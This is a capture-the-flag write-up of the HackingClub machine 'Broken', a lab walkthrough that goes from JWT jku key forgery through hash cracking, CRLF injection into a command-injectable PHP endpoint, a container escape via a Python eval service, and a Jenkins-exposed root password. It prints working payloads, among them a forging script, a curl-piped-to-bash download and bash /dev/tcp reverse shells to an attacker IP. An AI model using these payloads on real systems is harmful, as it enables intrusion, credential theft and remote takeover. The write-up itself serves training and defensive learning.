---
title: Broken
categories: [HackingClub]
tags: [jwt, jku, gitea, file-read, crlf-injection, ssrf, code-injection, jenkins]
media_subpath: /images/hackingclub_broken/
image:
  path: 'https://hackingclub-statics.s3.amazonaws.com/machine/thumbnails/7916192268cc75e60f5174.73222164'
---

## Summary

**Broken** is a HackingClub machine that demonstrates a complex multi-stage attack chain involving subdomain enumeration, JWT exploitation via JKU parameter manipulation, file read vulnerabilities, CRLF injection, Python code injection, and Jenkins privilege escalation. The initial compromise was achieved through discovering a JWT implementation that improperly validates the `jku` (JSON Web Key Set URL) parameter, allowing us to forge admin tokens by hosting our own JWKS endpoint. After gaining admin access to the API, we extracted and cracked the admin password hash to access Gitea. Through subdomain enumeration, we discovered a development subdomain with a file read vulnerability that we exploited using CRLF injection to achieve SSRF and command injection. This led to initial system access in a container, where we exploited a Python calculator service to escape to the host system. Finally, we leveraged Jenkins credentials to escalate privileges to root.

## Initial Enumeration

We begin by testing connectivity to the target machine:

```bash
curl -I 172.16.5.57
```

**Response:**
```
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 23 Nov 2025 05:12:15 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://broken.hc/
```

> **Discovery**: The server redirects to `http://broken.hc/`, indicating a virtual host configuration. We need to add this to our hosts file.
{: .prompt-info}

### Host Configuration

We add the domain to our hosts file:

```bash
echo '172.16.5.57 broken.hc' | sudo tee -a /etc/hosts
```

### Main Application

Accessing the main site reveals an "Under Maintenance" page:

![Under Maintenance Page](file-20251123091419423.png)

> The main site is under maintenance, so we need to enumerate subdomains to find other attack surfaces.
{: .prompt-warning}

## Subdomain Enumeration

We perform subdomain enumeration using `ffuf` with a DNS wordlist:

```bash
ffuf -u http://broken.hc -H 'Host: FUZZ.broken.hc' -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -ic -c -fs 154
```

> **Command Breakdown:**
> - `-u http://broken.hc`: Target URL
> - `-H 'Host: FUZZ.broken.hc'`: Host header with FUZZ placeholder for subdomain enumeration
> - `-w`: Wordlist file
> - `-ic`: Ignore comments in wordlist
> - `-c`: Colorize output
> - `-fs 154`: Filter out responses with size 154 (the maintenance page size)
{: .prompt-info}

**Results:**
```
api                     [Status: 200, Size: 440, Words: 53, Lines: 19, Duration: 213ms]
git                     [Status: 200, Size: 13439, Words: 1040, Lines: 241, Duration: 204ms]
```

> **Key Discovery**: We found two subdomains:
> - `api.broken.hc` - An API endpoint
> - `git.broken.hc` - A Git hosting service (likely Gitea)
{: .prompt-danger}

We update our hosts file:

```bash
echo '172.16.5.57 api.broken.hc git.broken.hc' | sudo tee -a /etc/hosts
```

## API Discovery and JWT Analysis

### Exploring the API

Accessing `api.broken.hc` reveals a broken API interface:

![Broken API](file-20251122181846054.png)

### Directory Enumeration

We perform directory enumeration using `dirsearch`:

```bash
dirsearch -u http://api.broken.hc
```

**Key Findings:**
```
[18:20:44] 200 -   459B - /.well-known/jwks.json
[18:23:37] 200 -   440B - /index.html
[18:24:03] 301 -   161B - /v1/api-docs  ->  /v1/api-docs/
```

> **Critical Discovery**: The API exposes a JWKS (JSON Web Key Set) endpoint at `/.well-known/jwks.json`. This suggests the API uses JWT for authentication.
{: .prompt-danger}

### JWKS Endpoint Analysis

We retrieve the JWKS configuration:

```bash
curl http://api.broken.hc/.well-known/jwks.json
```

**Response:**
```json
{
  "keys": [
    {
      "kty": "RSA",
      "n": "mocQ1bU9l4Y8VNwCQ12NfDpUIDutZnDOMN5eMW2rNFDEGJDMPV6gYelTBFAhG7inwIw01ffz9-hxG4ANmAWuup3t-i1SqHKgkA7pF7IZn6Cw4on7tfOi0wzjlaMhyEYBrdzZAz-jbWyG7iGgSNiCY54f6jI36bhCQwkU_hu6xB4suRyZXOdPAad61pRM08TCBwCOrK6LXvdUf11AtdFeNyQysp4TRaPRpdDa9zTbuG8D6d5ALxLLnN6-P6vjGWNP1CtMCMgv51iIbmJxz8CNAU6PT9Um4Sd5nUdIFAIpMVnUtuVEYIvRQ-vJD1QkNbX5jTMayUgyeCeXJqkbrGK_WQ",
      "e": "AQAB",
      "kid": "a1b2c3d4e5f6g7h8"
    }
  ]
}
```

> The JWKS contains an RSA public key with key ID `a1b2c3d4e5f6g7h8`. This key is used to verify JWT signatures.
{: .prompt-info}

### Swagger Documentation

Accessing `/v1/api-docs/` reveals Swagger API documentation:

![Swagger API Documentation](file-20251122182835373.png)

The API provides endpoints for:
- `/register` - User registration
- `/login` - User authentication (returns JWT)
- `/admin/*` - Admin endpoints (require admin privileges)

### User Registration and Login

We register a test user:

```bash
curl -X POST http://api.broken.hc/register \
  -H 'Content-Type: application/json' \
  -d '{"username":"railoca","password":"railoca"}'
```

**Response:**
```json
{"message":"User registered successfully","id":3}
```

We then login to obtain a JWT token:

```bash
curl -X POST http://api.broken.hc/login --json '{"username":"railoca","password":"railoca"}'
```

**Response:**
```json
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImExYjJjM2Q0ZTVmNmc3aDgiLCJqa3UiOiJodHRwOi8vbG9jYWxob3N0OjQwMDAvLndlbGwta25vd24vandrcy5qc29uIn0.eyJ1c2VybmFtZSI6InJhaWxvY2EiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc2Mzg3NTg4M30.Bcs6RInnUssL4Cg_aMUtrTXF_rrU35miTqwPZ2OwJAxzoXDK6P_qUma2iM1EiQZqjDq_FgY03a5FnS6ZECh08c8i8bXi4qgTyujr6BMbaOvGHWlfw1HbaTo0jS2RDQYS7br0FZNvt3TqVLONNYxfPG7Kfu_KdwcRFUH7z6egRysEkxFwbSXzIMeCqfOtZhXDbqtwiXAJ_KwjmkADFSKjPovq_ndO45iUSghjXBieNrvIfaFtUumUUDfJY08E44ffPWIt8J0WxpBoPrPBgjv7gNtFs4ok3Rg2dYpApLV3NKduX2XcypIGiNlDfahsFjdS_h9CZ2BqYOfY_F3Hmebhcg"}
```

### JWT Token Analysis

We decode the JWT token to examine its structure:

```bash
JWT="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImExYjJjM2Q0ZTVmNmc3aDgiLCJqa3UiOiJodHRwOi8vbG9jYWxob3N0OjQwMDAvLndlbGwta25vd24vandrcy5qc29uIn0.eyJ1c2VybmFtZSI6InJhaWxvY2EiLCJhZG1pbiI6ZmFsc2UsImlhdCI6MTc2Mzg3NTg4M30.Bcs6RInnUssL4Cg_aMUtrTXF_rrU35miTqwPZ2OwJAxzoXDK6P_qUma2iM1EiQZqjDq_FgY03a5FnS6ZECh08c8i8bXi4qgTyujr6BMbaOvGHWlfw1HbaTo0jS2RDQYS7br0FZNvt3TqVLONNYxfPG7Kfu_KdwcRFUH7z6egRysEkxFwbSXzIMeCqfOtZhXDbqtwiXAJ_KwjmkADFSKjPovq_ndO45iUSghjXBieNrvIfaFtUumUUDfJY08E44ffPWIt8J0WxpBoPrPBgjv7gNtFs4ok3Rg2dYpApLV3NKduX2XcypIGiNlDfahsFjdS_h9CZ2BqYOfY_F3Hmebhcg"
printf "HEADER:\n"; echo "$JWT" | cut -d '.' -f1 | tr '_-' '/+' | base64 -d 2>/dev/null | jq
printf "\nPAYLOAD:\n"; echo "$JWT" | cut -d '.' -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq
```

**Decoded Header:**
```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "a1b2c3d4e5f6g7h8",
  "jku": "http://localhost:4000/.well-known/jwks.json"
}
```

**Decoded Payload:**
```json
{
  "username": "railoca",
  "admin": false,
  "iat": 1763875883
}
```

> **Critical Vulnerability**: The JWT header contains a `jku` (JSON Web Key Set URL) parameter pointing to `http://localhost:4000/.well-known/jwks.json`. This is a **red flag** indicating that the JWT verification process may fetch the public key from an external URL. If the backend doesn't properly validate the `jku` domain, we can host our own JWKS endpoint and forge admin tokens.
{: .prompt-danger}

## JWT JKU Parameter Exploitation

### Understanding the Vulnerability

The `jku` parameter tells the JWT verifier: "Fetch the key from this URL to verify me." If the backend doesn't validate the `jku` domain, we can:
1. Generate our own RSA keypair
2. Host our own JWKS endpoint with our public key
3. Sign a JWT with our private key, setting `admin: true` in the payload
4. Point the `jku` to our malicious JWKS endpoint
5. The server will fetch our key and verify our forged token

### Generating RSA Keypair

We generate a new RSA keypair:

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
```

### Creating JWKS Endpoint

We create a JWKS file and forge a JWT token:

```python
# forge.py
# /// script
# requires-python = ">=3.12"
# dependencies = [
#     "pyjwt",
#     "jwcrypto",
# ]
# ///

import jwt, json
from jwcrypto import jwk

# === Config ===
PRIVATE_KEY_FILE = "private.pem"
PUBLIC_KEY_FILE = "public.pem"
JWKS_FILE = "jwks.json"
KID = "evil"
JKU = "http://10.0.72.105:8000/jwks.json"  # Our attacker-controlled server

# === 1. Load keys ===
with open(PRIVATE_KEY_FILE, "rb") as f:
    private_key = f.read()
with open(PUBLIC_KEY_FILE, "rb") as f:
    public_pem = f.read()

# === 2. Build JWKS ===
key = jwk.JWK.from_pem(public_pem)
jwk_dict = key.export(as_dict=True, private_key=False)
jwk_dict["kid"] = KID
jwks = {"keys": [jwk_dict]}

with open(JWKS_FILE, "w") as f:
    json.dump(jwks, f, indent=2)

print(f"[+] JWKS saved to {JWKS_FILE}")

# === 3. Forge JWT ===
payload = {
    "username": "attacker",
    "admin": True  # Set admin to true!
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": KID,
    "jku": JKU  # Point to our malicious JWKS endpoint
}

token = jwt.encode(payload, private_key, algorithm="RS256", headers=headers)
print("[+] Forged token:\n")
print(token)
```

**Execution:**
```bash
uv run forge.py
```

**Output:**
```
[+] JWKS saved to jwks.json
[+] Forged token:

eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4wLjcyLjEwNTo4MDAwL2p3a3MuanNvbiIsImtpZCI6ImV2aWwiLCJ0eXAiOiJKV1QifQ.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiYWRtaW4iOnRydWV9.F-pSG4vcugRWHrHvu3HjC03XGaaAQ4-GNDmC6FLjEmTfSRQJnY2pMutl6RulAAtbnM3FJJt-rkThPXV36_SzC4t7bh4mpVKxqxoBYvot5sDbUWdvBLw4C9mC1GyjbEsmYLHJV1vBz0J1yBfNr6qBoorGqBz5-aG9W-UJ5JD2G915L0AITlJwmsHrKLhgA2wz6GxrknpS4_90L-a0y1ylVQHYZyB-VgOdnzZJJddEutoZLm5inclf43G5N0UNveVXfddIcHwK_Pau-xGFBqnQ90N8hIJQe0OCFwyR6B3OxsyGrOg7Ut3GNW0cOj6Ksyh2_JT2oZ4d8rPIYC1Elte3Pw
```

### Hosting JWKS Endpoint

We start a Python HTTP server to host our JWKS endpoint:

```bash
python3 -m http.server 8000
```

### Testing Admin Access

We test our forged admin token by accessing the admin users endpoint:

```bash
curl http://api.broken.hc/admin/users \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly8xMC4wLjcyLjEwNTo4MDAwL2p3a3MuanNvbiIsImtpZCI6ImV2aWwiLCJ0eXAiOiJKV1QifQ.eyJ1c2VybmFtZSI6ImF0dGFja2VyIiwiYWRtaW4iOnRydWV9.F-pSG4vcugRWHrHvu3HjC03XGaaAQ4-GNDmC6FLjEmTfSRQJnY2pMutl6RulAAtbnM3FJJt-rkThPXV36_SzC4t7bh4mpVKxqxoBYvot5sDbUWdvBLw4C9mC1GyjbEsmYLHJV1vBz0J1yBfNr6qBoorGqBz5-aG9W-UJ5JD2G915L0AITlJwmsHrKLhgA2wz6GxrknpS4_90L-a0y1ylVQHYZyB-VgOdnzZJJddEutoZLm5inclf43G5N0UNveVXfddIcHwK_Pau-xGFBqnQ90N8hIJQe0OCFwyR6B3OxsyGrOg7Ut3GNW0cOj6Ksyh2_JT2oZ4d8rPIYC1Elte3Pw"
```

**Response:**
```json
[
  {"id":1,"username":"admin","password":"$2b$10$YzpZJ7ul8qR4tPCEUWeg1eRYbvHHvwjOmWYl1pBGBgpa0JolfqHGe","admin":1},
  {"id":2,"username":"test1","password":"$2b$10$OrZ04UJgAUfrQX7fngKFGOFp9KYIQBVNVyKdngmxBkfbmz3uGreYO","admin":0},
  {"id":3,"username":"railoca","password":"$2b$10$ea3WSKzqPykljA3.AiyhY.gLvpcc.G3IOMlSbQGaI.I9dV2j7cTxq","admin":0}
]
```

**Server Output:**
```
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.0.72.105 - - [22/Nov/2025 18:37:35] "GET /jwks.json HTTP/1.1" 200 -
172.16.5.57 - - [22/Nov/2025 18:38:30] "GET /jwks.json HTTP/1.1" 200 -
```

> **Success**: The target server fetched our JWKS endpoint! This confirms that the `jku` parameter is not properly validated. And we successfully accessed the admin endpoint and retrieved all user credentials, including password hashes!
{: .prompt-info}

## Admin Access and Password Extraction

### Extracting Admin Password Hash

We extract the admin password hash:

```bash
curl -s http://api.broken.hc/admin/users \
  -H "Authorization: Bearer [FORGED_TOKEN]" | \
  jq '.[]|select(.username=="admin")|.password' -r
```

**Output:**
```
$2b$10$YzpZJ7ul8qR4tPCEUWeg1eRYbvHHvwjOmWYl1pBGBgpa0JolfqHGe
```

> The password hash uses bcrypt (`$2b$`), which is a strong hashing algorithm. We'll attempt to crack it.
{: .prompt-info}

### Cracking the Password Hash

We save the hash and attempt to crack it using `hashcat`:

```bash
echo '$2b$10$YzpZJ7ul8qR4tPCEUWeg1eRYbvHHvwjOmWYl1pBGBgpa0JolfqHGe' > admin.hash
hashcat admin.hash /opt/rockyou.txt -O -m 3200 --show
```

> **Hash Type**: `-m 3200` corresponds to bcrypt (Blowfish(OpenBSD))
{: .prompt-info}

**Result:**
```
$2b$10$YzpZJ7ul8qR4tPCEUWeg1eRYbvHHvwjOmWYl1pBGBgpa0JolfqHGe:september
```

> **Success**: The admin password is `september`!
{: .prompt-info}

## Gitea Access

We access the Gitea instance at `git.broken.hc` and login with the admin credentials:

![Gitea Login](file-20251122184102162.png)

> We successfully logged into Gitea as admin. This may reveal additional information or credentials.
{: .prompt-info}

## Development Subdomain Discovery

While exploring Gitea, we discover a reference to `check-development.broken.hc`:

![Development Subdomain Discovery](file-20251122184123229.png)

We add this subdomain to our hosts file and explore it:

![Development Subdomain](file-20251122184212831.png)

![Development Subdomain Details](file-20251122184228035.png)

## File Read Vulnerability

### Testing the File Read Endpoint

We test the `/page` endpoint:

```bash
curl http://check-development.broken.hc/page/a
```

**Response:**
```
<br />
<b>Warning</b>:  readfile(a): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>5</b><br />
```

> **Discovery**: The error message reveals the source code location and suggests a file read vulnerability using PHP's `readfile()` function.
{: .prompt-warning}

### Reading Source Code

We read the source code by accessing `index.php`:

```bash
curl http://check-development.broken.hc/page/index.php
```

**Source Code:**
```php
<?php

$page = $_GET['page'];
if (isset($page)) {
    readfile($page);
} else {
    header('Location: /index.php?page=index.html');
}

?>
```

> **Critical Observation**: There's a **fundamental mismatch** between the URL structure and the PHP code:
> - **URL Structure**: `/page/index.php` (path-based routing)
> - **Code Expectation**: `$_GET['page']` (query parameter-based)
> 
> **How we inferred the proxy:**
> 1. When we access `/page/index.php`, we see the PHP source code that expects `$_GET['page']`
> 2. However, the URL uses path-based routing (`/page/filename`) instead of query parameters (`?page=filename`)
> 3. This means something **between** the client and PHP is transforming `/page/filename` → `index.php?page=filename`
> 4. This transformation is performed by a **reverse proxy** (likely Apache mod_rewrite, Nginx rewrite rules, or a dedicated proxy)
> 
> **Proxy behavior:** The proxy receives requests to `/page/*` and internally rewrites them to `index.php?page=*` before forwarding to the PHP backend. Everything after `/page/` becomes the value of the `page` query parameter.
{: .prompt-danger}

### Directory Enumeration

We enumerate directories to find additional files:

```bash
ffuf -u http://check-development.broken.hc/page/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -ic -c -mc 200 -e .php -fr "failed to open stream"
```

**Results:**
```
index.php               [Status: 200, Size: 148, Words: 16, Lines: 11, Duration: 151ms]
check.php               [Status: 200, Size: 136, Words: 19, Lines: 7, Duration: 152ms]
```

```php
<?php
if (isset($_POST['domain'])) {
    $secret = $_POST['domain'];
    echo "Output:" . shell_exec("nslookup " . $secret);
}
?>
```

> We discovered `check.php`, which may contain additional functionality.
{: .prompt-info}

## CRLF Injection Attack

### Understanding the Proxy Behavior and Attack Vector

Now that we've identified the proxy's rewrite behavior (`/page/*` → `index.php?page=*`), we can exploit this transformation. The key insight is:

**Normal flow:**
```
Client Request: GET /page/test
    ↓
Proxy receives: /page/test
    ↓
Proxy rewrites: index.php?page=test
    ↓
PHP receives: $_GET['page'] = 'test'
    ↓
PHP executes: readfile('test')
```

**The vulnerability:** The proxy's rewrite rule doesn't validate or sanitize what comes after `/page/`. Since everything after `/page/` becomes the value of the `page` parameter, we can inject **any content**, including HTTP protocol elements (newlines, headers, etc.).

**Attack strategy:**
1. `readfile()` in `index.php` can only read files - no command execution
2. `check.php` has `shell_exec()` - but requires a `POST` request with `domain` parameter
3. We can only send `GET` requests to `/page/*` endpoint
4. **Solution:** Embed a complete `POST` request to `/check.php` within the path parameter, using newlines to separate it from the original request

This is a **CRLF Injection** attack where we exploit the proxy's parsing behavior:
- **Proxy**: Parses the path and interprets `\r\n` (CRLF) characters as HTTP protocol delimiters
- **Backend**: Receives the embedded POST request that was injected via CRLF characters

### Crafting the Attack

We craft a malicious payload that embeds a complete HTTP POST request within the file path. The payload structure mimics a complete HTTP request that will be embedded in the path:

**Payload Structure:**
```
test HTTP/1.1\r\n
Host: check-development.broken.hc\r\n
User-Agent: curl/8.17.0\r\n
Connection: keep-alive\r\n
\r\n
POST /check.php HTTP/1.1\r\n
Host: check-development.broken.hc\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 43\r\n
\r\n
domain=;curl 10.0.72.105:8000/rev.sh | bash;\r\n
\r\n
GET /test HTTP/1.1\r\n
Host: check-development.broken.hc\r\n
\r\n
```

**Attack flow:**
1. **Client sends:** `GET /page/[entire_payload]` where payload contains newlines (`\r\n`)
2. **Proxy receives:** The path `/page/test HTTP/1.1\r\n...` with embedded HTTP request
3. **Proxy behavior (vulnerable):** 
   - The proxy's rewrite rule may not properly handle newlines in the path
   - When it encounters `\r\n` (HTTP line endings), it may interpret them as request boundaries
   - The proxy may forward the embedded `POST /check.php` request as a separate request
4. **Backend receives:** 
   - The embedded POST request to `/check.php` with our command injection payload
   - `check.php` processes `domain=;curl 10.0.72.105:8000/rev.sh | bash;`
   - Command injection executes via `shell_exec("nslookup " . $secret)`

**Why this works:**
- The proxy's rewrite rule (`/page/*` → `?page=*`) doesn't sanitize the path component
- Newlines (`\r\n`) are valid HTTP protocol delimiters
- When the proxy encounters these delimiters in the path, it may incorrectly parse them as separate requests
- The embedded POST request gets forwarded to the backend, bypassing the normal `readfile()` flow

We URL-encode this payload (newlines become `%0D%0A`, spaces become `%20`, etc.) and send it:

```bash
curl --raw --path-as-is \
'http://check-development.broken.hc/page/test%20HTTP/1.1%0D%0AHost:%20check-development.broken.hc%0D%0AUser-Agent:%20curl%0D%0AConnection:%20keep-alive%0D%0A%0D%0APOST%20/check.php%20HTTP/1.1%0D%0AHost:%20check-development.broken.hc%0D%0AContent-Type:%20application/x-www-form-urlencoded%0D%0AContent-Length:%2043%0D%0A%0D%0Adomain=%3bcurl%2010.0.72.105:8000/rev.sh%20%7c%20bash%3b%0D%0A%0D%0AGET%20/test%20HTTP/1.1%0D%0AHost:%20check-development.broken.hc%0D%0A%0D%0A'
```

> **Technical Deep Dive - CRLF Injection Attack:**
> 
> This attack is a **CRLF (Carriage Return Line Feed) Injection** vulnerability, not traditional request smuggling. CRLF injection occurs when we can inject HTTP protocol delimiters (`\r\n`) into user-controlled input:
> 
> 1. **Normal flow:** `/page/test` → Proxy rewrites → `index.php?page=test` → `readfile('test')`
> 2. **Attack flow:** `/page/test\r\nPOST /check.php...` → Proxy encounters `\r\n` → Proxy interprets as HTTP line endings → Embedded POST request is parsed and forwarded
> 
> **CRLF Injection mechanism:**
> - `\r\n` (CRLF) are the standard HTTP line delimiters (carriage return + line feed)
> - When injected into the path, the proxy's parser may interpret them as actual HTTP protocol delimiters
> - This allows us to inject HTTP headers or even complete requests within the path parameter
> - The proxy doesn't sanitize these control characters, treating them as valid HTTP syntax
> 
> **Why this works:**
> - The proxy's rewrite rule (`/page/*` → `?page=*`) doesn't sanitize or escape CRLF characters
> - When the proxy processes the path and encounters `\r\n`, it may interpret them as request boundaries
> - The embedded POST request after the CRLF gets parsed as a separate HTTP request
> - This effectively allows us to inject a POST request through a GET endpoint parameter
> 
> This is a **CRLF injection** attack - we're injecting a second HTTP request (POST to `/check.php`) by exploiting how the proxy parses CRLF characters (`\r\n`) in the path parameter. The CRLF characters act as HTTP protocol delimiters, causing the proxy to interpret our injected content as a separate request.
{: .prompt-tip}

### Preparing Reverse Shell

We create a reverse shell script:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.0.72.105/9999 0>&1
```

We host this on our server and ensure it's accessible.

### Executing the Attack

After sending the curl command, we successfully trigger the command injection. Our server receives the request:

```
172.16.5.57 - - [22/Nov/2025 19:10:22] "GET /rev.sh HTTP/1.1" 200 -
```

> **Success**: The target server fetched our reverse shell script, indicating command execution!
{: .prompt-info}

### Initial Foothold

We receive a reverse shell connection:

```bash
nc -lvnp 9999
```

**Output:**
```
Connection from 172.16.5.57:45504
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cb051c3bee38:/var/www/html$
```

> **Initial Access**: We have a shell as `www-data` in a container (`cb051c3bee38`). We need to escape to the host system.
{: .prompt-info}

### Discovering Calculator Service

We explore the `/opt` directory:

```bash
cd /opt
ls -la
```

**Output:**
```
total 12
drwxr-xr-x 1 root root 4096 Sep 14 21:56 .
drwxr-xr-x 1 root root 4096 Sep 14 21:53 ..
-rw-r--r-- 1 root root  382 Sep 14 22:09 calculator.py
```

We examine `calculator.py`:

```python
import socket

HOST_IP = '172.17.0.1'
PORT = 1775

def client():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST_IP, PORT))
        expression = input("Enter your expression to evaluate: ")
        s.sendall(expression.encode())
        data = s.recv(1024).decode()
        print(f"Result: {data}")

if __name__ == "__main__":
    client()
```

> **Discovery**: The script connects to `172.17.0.1:1775`, which is likely the Docker host. The service appears to evaluate mathematical expressions. If the server uses `eval()` or similar, we may be able to inject Python code.
{: .prompt-danger}

## Calculator.py Exploitation

### Testing Code Injection

We first test if we can execute Python code:

```bash
python3 calculator.py
```

**Input:**
```
os.system(id)
```

**Output:**
```
Result: Error: name 'os' is not defined
```

> The server evaluates the expression, but `os` is not imported. We need to use `__import__()` to import modules.
{: .prompt-info}

### Successful Code Injection

We inject Python code to execute a reverse shell:

```bash
python3 calculator.py
```

**Input:**
```
__import__('os').system('bash -c "bash -i >& /dev/tcp/10.0.72.105/9999 0>&1"')
```

> **Success**: We receive a reverse shell connection from the host system!
{: .prompt-info}

**Output:**
```
Connection from 172.16.5.57:35738
bash: cannot set terminal process group (2030): Inappropriate ioctl for device
bash: no job control in this shell
leonardo@ip-172-16-5-57:/opt$
```

> **Privilege Escalation**: We now have a shell as `leonardo` on the host system (`ip-172-16-5-57`)!
{: .prompt-info}

## Privilege Escalation to Root

### Jenkins Discovery

We discover Jenkins running on the system. We check for Jenkins tokens:

```bash
cat /etc/jenkins_token
```

We export the token and test Jenkins API access:

```bash
export JENKINS_TOKEN=$(tail -n 1 /etc/jenkins_token)
curl -u ek1l:$JENKINS_TOKEN 'http://127.0.0.1:8080/api/json?tree=jobs%5Bname,url%5D'
```

**Response:**
```json
{"_class":"hudson.model.Hudson","jobs":[{"_class":"hudson.model.FreeStyleProject","name":"project","url":"http://127.0.0.1:8080/job/project/"}]}
```

> We have access to Jenkins! We can enumerate jobs and potentially execute commands.
{: .prompt-info}

### Jenkins Job Enumeration

We retrieve job details:

```bash
curl -u ek1l:$JENKINS_TOKEN "http://127.0.0.1:8080/job/project/api/json?pretty=true"
```

We examine the build console output:

```bash
curl -u ek1l:$JENKINS_TOKEN "http://127.0.0.1:8080/job/project/1/consoleText"
```

**Output:**
```
Started from command line by ek1l
Running as SYSTEM
Building in workspace /var/jenkins_home/workspace/project
[project] $ /bin/sh -xe /tmp/jenkins131674156726906867.sh
+ MY_VAR1=root
+ MY_VAR2=ex3ZDK1I4Lxmm77wzp0wCic3Bno7hXu2iX4VeSeZj
...
```

> **Discovery**: The Jenkins job runs as `SYSTEM` and sets `MY_VAR1=root`. This suggests we may be able to modify the job to execute commands as root.
{: .prompt-warning}

### Root Access

We attempt to switch to root using the discovered password:

```bash
su root
```

**Password:** `ex3ZDK1I4Lxmm77wzp0wCic3Bno7hXu2iX4VeSeZj` (from `MY_VAR2`)

> **Success**: We successfully switch to root!
{: .prompt-info}

**Verification:**
```bash
root@ip-172-16-5-57:/home/leonardo# cd /root
root@ip-172-16-5-57:~# ls
root.txt  snap
```

## Conclusion

### Quick Recap

- **Initial Enumeration**: Discovered subdomains `api.broken.hc` and `git.broken.hc`
- **JWT Exploitation**: Exploited improper `jku` parameter validation to forge admin tokens
- **Password Extraction**: Extracted and cracked admin password hash from API
- **Gitea Access**: Logged into Gitea with admin credentials
- **Subdomain Discovery**: Found `check-development.broken.hc` with file read vulnerability
- **CRLF Injection**: Exploited file read vulnerability via CRLF injection to achieve SSRF and command injection
- **Container Escape**: Exploited Python calculator service to escape container
- **Privilege Escalation**: Used Jenkins credentials to escalate to root

### Lessons Learned

- **JWT Security**: The `jku` parameter must be strictly validated to prevent external key set injection attacks
- **File Read Vulnerabilities**: Direct use of user input in file operations can lead to SSRF and command injection
- **Container Security**: Services exposed from containers to the host can be exploited to escape containers
- **Code Injection**: User input in expression evaluators must be sanitized to prevent code injection
- **Jenkins Security**: Jenkins tokens and job configurations must be properly secured
- **Defense in Depth**: Multiple security controls should protect critical systems and credentials

### Attack Chain Summary

1. **Subdomain Enumeration** → Discovered API and Git subdomains
2. **JWT Analysis** → Identified vulnerable `jku` parameter
3. **Token Forgery** → Hosted malicious JWKS and forged admin token
4. **Password Extraction** → Retrieved and cracked admin password hash
5. **Gitea Access** → Logged into Git repository
6. **Development Subdomain** → Discovered file read vulnerability
7. **CRLF Injection** → Achieved SSRF and command injection
8. **Container Escape** → Exploited Python calculator service
9. **Privilege Escalation** → Used Jenkins to gain root access

This machine demonstrates the importance of proper input validation, secure JWT implementation, and defense-in-depth security practices across all layers of an application stack.
